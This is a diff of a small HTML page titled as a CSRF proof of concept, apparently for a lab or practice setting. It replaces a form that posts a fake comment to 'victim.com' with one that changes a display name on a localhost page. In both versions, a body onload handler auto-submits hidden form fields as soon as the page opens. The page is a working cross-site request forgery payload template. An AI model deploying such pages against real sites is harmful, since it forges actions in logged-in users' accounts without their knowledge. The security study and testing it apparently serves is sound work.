@@ -2,16 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CSRF PoC - Post Fake Comment</title>
+  <title>CSRF PoC - Change Name</title>
 </head>
 <body onload="document.forms[0].submit()">
-  <h2>CSRF PoC: Post a Fake Comment</h2>
-  <p>This form will automatically submit a comment if the user is logged in.</p>
+  <h2>CSRF PoC: Change Display Name</h2>
 
-  <form action="http://victim.com/post_comment" method="POST">
-    <!-- Replace action URL with the vulnerable endpoint -->
-    <input type="hidden" name="comment" value="This site is vulnerable to CSRF!" />
-    <input type="hidden" name="post_id" value="12345" />
+  <form action="http://localhost/vulnerable.html" method="GET">
+    <input type="hidden" name="name" value="HackedName123" />
   </form>
 </body>
 </html>
